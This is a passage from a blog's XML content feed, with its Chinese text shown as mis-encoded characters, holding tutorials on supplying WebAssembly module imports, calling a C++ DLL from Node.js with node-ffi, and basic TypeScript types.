class="number">0</span></span><br><span class="line"><span class="keyword">if</span> (!imports.env.memory) &#123;</span><br><span class="line">    imports.env.memory = <span class="keyword">new</span> WebAssembly.Memory(&#123; <span class="attr">initial</span>: <span class="number">256</span> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºå˜é‡æ˜ å°„è¡¨</span></span><br><span class="line">imports.env.tableBase = imports.env.tableBase || <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> (!imports.env.table) &#123;</span><br><span class="line">    imports.env.table = <span class="keyword">new</span> WebAssembly.Table(&#123; <span class="attr">initial</span>: <span class="number">2</span>, <span class="attr">element</span>: <span class="string">&#x27;anyfunc&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>** é—®é¢˜å…³é”® **</p><p>å¯æ˜¯æˆ‘å¯¼å‡ºæ¥çš„wasm-moduleä¸æ­¢è¿™å‡ ä¸ªã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;memory&quot;</span> (memory <span class="variable">$env</span>.memory 256))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;table&quot;</span> (table <span class="variable">$env</span>.table 2 anyfunc))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;memoryBase&quot;</span> (global <span class="variable">$env</span>.memoryBase i32))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;tableBase&quot;</span> (global <span class="variable">$env</span>.tableBase i32))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;DYNAMICTOP_PTR&quot;</span> (global <span class="variable">$env</span>.DYNAMICTOP_PTR i32))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;tempDoublePtr&quot;</span> (global <span class="variable">$env</span>.tempDoublePtr i32))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;ABORT&quot;</span> (global <span class="variable">$env</span>.ABORT i32))</span><br><span class="line">(import <span class="string">&quot;global&quot;</span> <span class="string">&quot;NaN&quot;</span> (global <span class="variable">$global</span>.NaN f64))</span><br><span class="line">(import <span class="string">&quot;global&quot;</span> <span class="string">&quot;Infinity&quot;</span> (global <span class="variable">$global</span>.Infinity f64))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;abortStackOverflow&quot;</span> (func <span class="variable">$env</span>.abortStackOverflow (<span class="built_in">type</span> <span class="variable">$t0</span>)))</span><br><span class="line">(import <span class="string">&quot;env&quot;</span> <span class="string">&quot;nullFunc_X&quot;</span> (func <span class="variable">$env</span>.nullFunc_X (<span class="built_in">type</span> <span class="variable">$t0</span>)))</span><br><span class="line">(func <span class="variable">$f2</span> (<span class="built_in">type</span> <span class="variable">$t1</span>) (param <span class="variable">$p0</span> i32) (result i32)</span><br></pre></td></tr></table></figure><p>** å¤„ç†æ–¹æ¡ˆï¼š **</p><ul><li>æ‰€ä»¥è¦å¯¹å¤šå¯¼å‡ºæ¥çš„èµ„æºè¿›è¡Œå¤„ç†ã€‚<br>è¿™äº›éƒ½æ˜¯å®ä¾‹åŒ–moduleéœ€è¦æä¾›çš„import.åŠ å…¥å¯¹åº”çš„å­—æ®µå³å¯å¤„ç†ï¼</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">imports.env.DYNAMICTOP_PTR = imports.env.DYNAMICTOP_PTR || <span class="number">0</span>;</span><br><span class="line">imports.env.tempDoublePtr = imports.env.tempDoublePtr || <span class="number">0</span>;</span><br><span class="line">imports.env.ABORT = imports.env.ABORT || <span class="number">0</span>;</span><br><span class="line">imports.global = imports.global || &#123; <span class="attr">NaN</span>: <span class="number">1</span>, <span class="attr">Infinity</span>: <span class="number">2</span> &#125;;</span><br><span class="line">imports.env.abortStackOverflow = imports.env.abortStackOverflow || <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">imports.env.nullFunc_X = imports.env.nullFunc_X || <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br></pre></td></tr></table></figure><ul><li>è¿˜æœ‰ä¸€ç§æ›´ç®€æ´çš„ã€‚<br>ä½¿ç”¨wasm-gcå»å¤„ç†ã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> webAssembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node-dll è°ƒç”¨</title>
      <link href="posts/cf777cb3/"/>
      <url>posts/cf777cb3/</url>
      
        <content type="html"><![CDATA[<h3 id="DLLä»‹ç»"><a href="#DLLä»‹ç»" class="headerlink" title="DLLä»‹ç»"></a>DLLä»‹ç»</h3><p>DLL(Dynamic Link Library)æ–‡ä»¶ä¸ºåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œåˆç§°â€åº”ç”¨ç¨‹åºæ‹“å±•â€ï¼Œæ˜¯è½¯ä»¶æ–‡ä»¶ç±»å‹ã€‚åœ¨Windowsä¸­ï¼Œè®¸å¤šåº”ç”¨ç¨‹åºå¹¶ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ƒä»¬è¢«åˆ†å‰²æˆä¸€äº›ç›¸å¯¹ç‹¬ç«‹çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå³DLLæ–‡ä»¶ï¼Œæ”¾ç½®äºç³»ç»Ÿä¸­ã€‚å½“æˆ‘ä»¬æ‰§è¡ŒæŸä¸€ä¸ªç¨‹åºæ—¶ï¼Œç›¸åº”çš„DLLæ–‡ä»¶å°±ä¼šè¢«è°ƒç”¨ã€‚ä¸€ä¸ªåº”ç”¨ç¨‹åºå¯ä½¿ç”¨å¤šä¸ªDLLæ–‡ä»¶ï¼Œä¸€ä¸ªDLLæ–‡ä»¶ä¹Ÿå¯èƒ½è¢«ä¸åŒçš„åº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œè¿™æ ·çš„DLLæ–‡ä»¶è¢«ç§°ä¸ºå…±äº«DLLæ–‡ä»¶ã€‚</p><h3 id="Node-æ€ä¹ˆè°ƒç”¨DLL"><a href="#Node-æ€ä¹ˆè°ƒç”¨DLL" class="headerlink" title="Node æ€ä¹ˆè°ƒç”¨DLL"></a>Node æ€ä¹ˆè°ƒç”¨DLL</h3><p>ä½¿ç”¨ node-ffi æ¨¡å—ï¼Œéå¸¸çµæ´»çš„nodeä¸­å»è°ƒç”¨dllä¸­æš´éœ²çš„æ–¹æ³•ã€‚</p><a id="more"></a><h3 id="å®‰è£…node-ffiæ¨¡å—"><a href="#å®‰è£…node-ffiæ¨¡å—" class="headerlink" title="å®‰è£…node-ffiæ¨¡å—"></a>å®‰è£…node-ffiæ¨¡å—</h3><blockquote><p><a href="https://github.com/nodejs/node-gyp">Node-gyp</a><br><a href="https://github.com/nodejs/node-gyp">https://github.com/nodejs/node-gyp</a></p></blockquote><blockquote><p><a href="https://github.com/node-ffi/node-ffi">Node-ffi</a><br><a href="https://github.com/node-ffi/node-ffi">https://github.com/node-ffi/node-ffi</a></p></blockquote><blockquote><p>å®‰è£…å‘½ä»¤  npm install ffi</p></blockquote><p>** åœ¨å®‰è£…node-ffiæ¨¡å—å‰ï¼Œå¿…é¡»ä¿è¯node-gyp å®‰è£…æˆåŠŸï¼Œå¹¶ä¸”node-gypå¯ä»¥ä½¿ç”¨ **</p><h3 id="å®‰è£…node-ffi-é‡åˆ°çš„å‘"><a href="#å®‰è£…node-ffi-é‡åˆ°çš„å‘" class="headerlink" title="å®‰è£…node-ffi é‡åˆ°çš„å‘"></a>å®‰è£…node-ffi é‡åˆ°çš„å‘</h3><p>å¦‚æœå®‰è£…æˆåŠŸäº†ï¼Œå°±çœ‹çœ‹æˆ‘æ˜¯æ€ä¹ˆè§£å†³è¿™ä¸ªå‘çš„å§ã€‚</p><p>ä¸çŸ¥é“æ˜¯æ€ä¹ˆå›äº‹ï¼Œæ¯æ¬¡å®‰è£…ffiæ¨¡å—ï¼Œéƒ½ä¼šå¯¼è‡´ node-gyp build  V8ç±»å‹å‡ºé”™ã€‚</p><p>** è§£å†³æ–¹æ³•ï¼š**<br>ç›´æ¥å…‹éš†node-ffiä»“åº“åˆ°æœ¬åœ°ï¼ŒæŠŠnode-ffi æ”¾åˆ°å…¨å±€çš„ node-modulesä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://github.com/node-ffi/node-ffi.git </span><br></pre></td></tr></table></figure><p>å†è¿›å…¥CMDå‘½ä»¤çª—å£ä¸­ï¼Œæ‰§è¡Œ** npm install node-ffi â€“g **,å³å¯æˆåŠŸå®‰è£…ã€‚<br>å®‰è£…å®Œåï¼Œå…¨å±€çš„ node-modulesä¸­ä¼šå‡ºç° å¿«æ·æ–¹å¼çš„ ffiæ–‡ä»¶å¤¹ã€‚<br>éœ€è¦åˆ›å»ºä¸€ä¸ªffiæ–‡ä»¶å¤¹ï¼Œå¹¶æŠŠå¿«æ·æ–¹å¼çš„ ffiæ–‡ä»¶å¤¹å†…å®¹å‰ªåˆ‡åˆ° æ–°çš„ ffiæ–‡ä»¶å¤¹ä¸­ï¼Œä¹Ÿå°±æ˜¯å»æ‰å¿«æ·æ–¹å¼å³å¯ã€‚</p><h3 id="å¼€å‘DLL"><a href="#å¼€å‘DLL" class="headerlink" title="å¼€å‘DLL"></a>å¼€å‘DLL</h3><blockquote><p>å¼€å‘DLLå·¥å…·ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯VS2015ã€‚</p></blockquote><p>** æ­¥éª¤ï¼šb**</p><p>å¼€å‘DLLå·¥å…·ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯VS2015ã€‚<br>æ‰“å¼€** VS2015 ** -&gt; ** æ–‡ä»¶ ** -&gt; ** æ–°å»º ** -&gt; ** é¡¹ç›® ** -&gt; ** é€‰æ‹©Win32æ§åˆ¶å°åº”ç”¨ç¨‹åº **</p><img src="/posts/cf777cb3/node-dll-1.png" class="" title="åˆ›å»ºé¡¹ç›®"><img src="/posts/cf777cb3/node-dll-2.png" class="" title="åº”ç”¨ç¨‹åºå‘å¯¼"><p>é€‰æ‹© ** ä¸‹ä¸€æ­¥ **</p><p>é€‰æ‹© ** æ§åˆ¶å°åº”ç”¨ç¨‹åº ç©ºé¡¹ç›® ** æœ€åç‚¹å‡» ** å®Œæˆ **</p><img src="/posts/cf777cb3/node-dll-4.png" class="" title="åº”ç”¨ç¨‹åºå‘å¯¼"><p>å³å‡»** nodeFile ** é¡¹ç›®åç§°ï¼Œé€‰æ‹© ** æ·»åŠ  ** -&gt; ** æ–°å»ºé¡¹ **</p><img src="/posts/cf777cb3/node-dll-5.png" class="" title="åº”ç”¨ç¨‹åºå‘å¯¼"><p>é€‰æ‹© ** å¤´æ–‡ä»¶ **ï¼Œåç§°æˆ‘å†™çš„ ** fileChange.h **ç‚¹å‡»æ·»åŠ </p><p>åŒç†ï¼Œç›¸åŒçš„æ­¥éª¤åˆ›å»ºC++æ–‡ä»¶ï¼ˆ.cppï¼‰ï¼Œåç§°fileChange.cpp ç‚¹å‡»æ·»åŠ </p><p>åœ¨æºæ–‡ä»¶ ** fileChange.cpp ** ä¸­ç¼–å†™ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fileChange.cpp </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fileChange.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åŒæ­¥å‡½æ•°ï¼Œæ±‚å’Œæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> i + j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¼‚æ­¥å‡½æ•°ï¼Œæ±‚å’Œæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addSync</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">void</span> (*callfuct)(<span class="keyword">int</span> a, <span class="keyword">int</span> b))</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum = i + j;</span><br><span class="line">callfuct(sum, j);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>åœ¨å¤´æ–‡ä»¶ ** fileChange.h ** ä¸­ç¼–å†™ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  fileChange.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">addSync</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">void</span> (*callfuct)(<span class="keyword">int</span> a, <span class="keyword">int</span> b))</span></span>;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¿…é¡»ä½¿ç”¨ï¼Œ** extern â€œCâ€ ** è®©ç¼–è¯‘å™¨ä½¿ç”¨Cè§£ææ–¹æ³•å»å¯¼å‡ºDLLï¼Œä¸ç„¶node-ffiæ¨¡å—è¯†åˆ«ä¸äº†ã€‚</p><h3 id="ç”ŸæˆDLL"><a href="#ç”ŸæˆDLL" class="headerlink" title="ç”ŸæˆDLL"></a>ç”ŸæˆDLL</h3><p>å› ä¸ºæˆ‘çš„ç”µè„‘ç¯å¢ƒæ˜¯64ä½ï¼Œnodeä¹Ÿæ˜¯64ä½ï¼Œæ‰€ä»¥æˆ‘å¯¼å‡ºçš„dllä¹Ÿéœ€è¦æ˜¯64ä½ï¼Œä¸ç„¶node-ffiä¹Ÿæ˜¯è°ƒç”¨ä¸æˆåŠŸã€‚</p><p>** å¯¼å‡ºæ–¹æ³•ï¼š **</p><img src="/posts/cf777cb3/node-dll-6.png" class="" title="å¯¼å‡ºæ–¹æ³•"><p>å¯¼å‡ºçš„dllæ–‡ä»¶åœ¨åœ¨é¡¹ç›®ç›®å½•ä¸‹çš„ \x64\Debug ä¸­ï¼Œå³å¯æ‰¾åˆ° nodeFile.dllåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚</p><img src="/posts/cf777cb3/node-dll-7.png" class="" title="åº”ç”¨ç¨‹åºå‘å¯¼"><h3 id="nodeä½¿ç”¨DLL"><a href="#nodeä½¿ç”¨DLL" class="headerlink" title="nodeä½¿ç”¨DLL"></a>nodeä½¿ç”¨DLL</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¯¼å…¥ffiæ¨¡å—</span></span><br><span class="line"><span class="keyword">var</span> ffi = <span class="built_in">require</span>(<span class="string">&#x27;ffi&#x27;</span>);</span><br><span class="line"><span class="comment">//ä½¿ç”¨ffi.LibraryåŠ è½½dll, ç¬¬ä¸€ä¸ªå‚èµ›æ˜¯åº“æ–‡ä»¶è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯JSONæ ¼å¼ï¼Œç”¨äºå®šä¹‰ä½¿ç”¨çš„dllæ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment">//int è¡¨ç¤ºæ•´å½¢ï¼Œpointer è¡¨ç¤º æŒ‡é’ˆåœ°å€ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ int * è¡¨ç¤ºã€‚</span></span><br><span class="line"><span class="keyword">var</span> libm = ffi.Library(<span class="string">&#x27;./../dll/nodeFlie&#x27;</span>, &#123;</span><br><span class="line">  <span class="string">&#x27;add&#x27;</span>: [ <span class="string">&#x27;int&#x27;</span>, [ <span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span> ] ],</span><br><span class="line">  <span class="string">&#x27;addSync&#x27;</span>: [<span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]]</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨æ–¹æ³•</span></span><br><span class="line"><span class="keyword">const</span> sum = libm.add(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sum);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ å›è°ƒå‡½æ•°</span></span><br><span class="line"><span class="keyword">let</span> addCallback = ffi.Callback(<span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>], <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a,b);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œå›è°ƒçš„ dllæ–¹æ³•</span></span><br><span class="line">libm.addSync(<span class="number">2</span>,<span class="number">3</span>,addCallback);</span><br><span class="line"></span><br><span class="line">æ‰§è¡Œç»“æœï¼š</span><br><span class="line"></span><br><span class="line">PS E:\nodejsproject\node-fileChangeAttr\src&gt; node .\index.js</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">5</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> dll </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typeScript</title>
      <link href="posts/9f19e967/"/>
      <url>posts/9f19e967/</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><blockquote><p>npm  i  -g  typescript</p></blockquote><h3 id="å¼€å‘è¾…åŠ©"><a href="#å¼€å‘è¾…åŠ©" class="headerlink" title="å¼€å‘è¾…åŠ©"></a>å¼€å‘è¾…åŠ©</h3><h4 id="ç¼–è¯‘-tsä¸ºjsæ–‡ä»¶"><a href="#ç¼–è¯‘-tsä¸ºjsæ–‡ä»¶" class="headerlink" title="ç¼–è¯‘ tsä¸ºjsæ–‡ä»¶"></a>ç¼–è¯‘ tsä¸ºjsæ–‡ä»¶</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tsc xxxx.ts</span><br></pre></td></tr></table></figure><h4 id="åœ¨vscodeä¸­ï¼Œè‡ªåŠ¨ç¼–è¯‘ts"><a href="#åœ¨vscodeä¸­ï¼Œè‡ªåŠ¨ç¼–è¯‘ts" class="headerlink" title="åœ¨vscodeä¸­ï¼Œè‡ªåŠ¨ç¼–è¯‘ts"></a>åœ¨vscodeä¸­ï¼Œè‡ªåŠ¨ç¼–è¯‘ts</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tsc --init   // ç”Ÿæˆé…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">out.dir :<span class="string">&#x27;&#x27;</span>  // ä¿®æ”¹tsconfig.jså­—æ®µï¼Œ jsç”Ÿæˆç›®å½•</span><br><span class="line"></span><br><span class="line">é€‰æ‹© -&gt; ä»»åŠ¡ -&gt; è¿è¡Œä»»åŠ¡ -&gt; ç›‘è§†ts</span><br></pre></td></tr></table></figure><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><ul><li>string             å­—ç¬¦ä¸²</li><li>boolean            å¸ƒå°”</li><li>number            æ•°å€¼</li><li>Array | []         æ•°ç»„</li><li>[ ç±»å‹]           å…ƒç»„</li><li>enum                æšä¸¾</li></ul><a id="more"></a><ul><li> any                ä»»æ„ç±»å‹</li><li>undefined            æœªçŸ¥-æœªå®šä¹‰</li><li>null                ç©º</li><li>never             ä¸ä¼šå‡ºç°çš„å€¼ï¼ŒåŒ…å« null å’Œ nudefined</li></ul><h3 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h3><ul><li>ç±»çš„ æŠ½è±¡ æ¥å£ å¤šæ€ æ³›å‹</li><li>å‡½æ•° æ¥å£ æ³›å‹ ä¼ å‚ å¯çœç•¥å‚æ•°  åŒ¿åå‡½æ•° å®šä¹‰</li></ul><blockquote><p>å¦‚æœæœ‰é¢å‘å¯¹è±¡çš„åå°å¼€å‘è¯­è¨€åŸºç¡€ å¦‚ï¼šJava ç†è§£èµ·æ¥æ›´å¿«</p></blockquote><h3 id="ç®€æ˜ä»£ç "><a href="#ç®€æ˜ä»£ç " class="headerlink" title="ç®€æ˜ä»£ç "></a>ç®€æ˜ä»£ç </h3><h4 id="å˜é‡çš„å®šä¹‰"><a href="#å˜é‡çš„å®šä¹‰" class="headerlink" title="å˜é‡çš„å®šä¹‰"></a>å˜é‡çš„å®šä¹‰</h4><h5 id="stringå­—ç¬¦ä¸²ç±»å‹"><a href="#stringå­—ç¬¦ä¸²ç±»å‹" class="headerlink" title="stringå­—ç¬¦ä¸²ç±»å‹"></a>stringå­—ç¬¦ä¸²ç±»å‹</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str:string = <span class="string">&quot;ä½ å¥½&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="booleanå¸ƒå°”ç±»å‹"><a href="#booleanå¸ƒå°”ç±»å‹" class="headerlink" title="booleanå¸ƒå°”ç±»å‹"></a>booleanå¸ƒå°”ç±»å‹</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag:boolean= <span class="literal">true</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Numberæ•°å€¼ç±»å‹"><a href="#Numberæ•°å€¼ç±»å‹" class="headerlink" title="Numberæ•°å€¼ç±»å‹"></a>Numberæ•°å€¼ç±»å‹</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> num:number = <span class="number">123</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Arrayæ•°ç»„ç±»å‹"><a href="#Arrayæ•°ç»„ç±»å‹" class="headerlink" title="Arrayæ•°ç»„ç±»å‹"></a>Arrayæ•°ç»„ç±»å‹</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr:number[]=[<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>]</span><br><span class="line"><span class="keyword">var</span> arr1:<span class="built_in">Array</span>&lt;number&gt;=[<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="å…ƒç»„ç±»å‹"><a href="#å…ƒç»„ç±»å‹" class="headerlink" title="[]å…ƒç»„ç±»å‹"></a>[]å…ƒç»„ç±»å‹</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr2:[number,string]=[<span class="number">123</span>,<span class="string">&#x27;234&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="enumæšä¸¾ç±»å‹"><a href="#enumæšä¸¾ç±»å‹" class="headerlink" title="enumæšä¸¾ç±»å‹"></a>enumæšä¸¾ç±»å‹</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enum COLOR &#123;</span><br><span class="line">    blue=<span class="number">123</span>, red=<span class="number">456</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¦‚æœ æ²¡æœ‰ç»™æšä¸¾å®šä¹‰çš„å˜é‡ å¤åˆ¶ï¼Œå°±æ˜¯è¿”å›ä¸‹æ ‡ã€‚å¦åˆ™è¿”å›å€¼</span></span><br><span class="line"><span class="keyword">let</span> myColor:COLOR = COLOR.blue;</span><br><span class="line"><span class="built_in">console</span>.log(myColor)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="anyä»»æ„ç±»å‹"><a href="#anyä»»æ„ç±»å‹" class="headerlink" title="anyä»»æ„ç±»å‹"></a>anyä»»æ„ç±»å‹</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> numx:any = <span class="number">123</span>;</span><br><span class="line">numx=<span class="string">&#x27;222&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="null-undefinedç±»å‹"><a href="#null-undefinedç±»å‹" class="headerlink" title="null-undefinedç±»å‹"></a>null-undefinedç±»å‹</h5><blockquote><p>å…¶å®ƒæ•°æ®ç±»å‹çš„å­ç±»å‹</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> nums:number|<span class="literal">undefined</span>;</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br><span class="line">nums=<span class="number">12</span>;</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="voidç±»å‹"><a href="#voidç±»å‹" class="headerlink" title="voidç±»å‹"></a>voidç±»å‹</h5><blockquote><p>æ²¡æœ‰ä»»ä½•ç±»å‹ , ä¸€èˆ¬ ç”¨äº æ–¹æ³•è¿”å›</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setAge</span>(<span class="params"></span>):<span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">setAge();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setAges</span>(<span class="params"></span>):<span class="title">number</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1211</span>;</span><br><span class="line">&#125;</span><br><span class="line">setAge();</span><br><span class="line"><span class="built_in">console</span>.log(setAges());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="neverç±»å‹"><a href="#neverç±»å‹" class="headerlink" 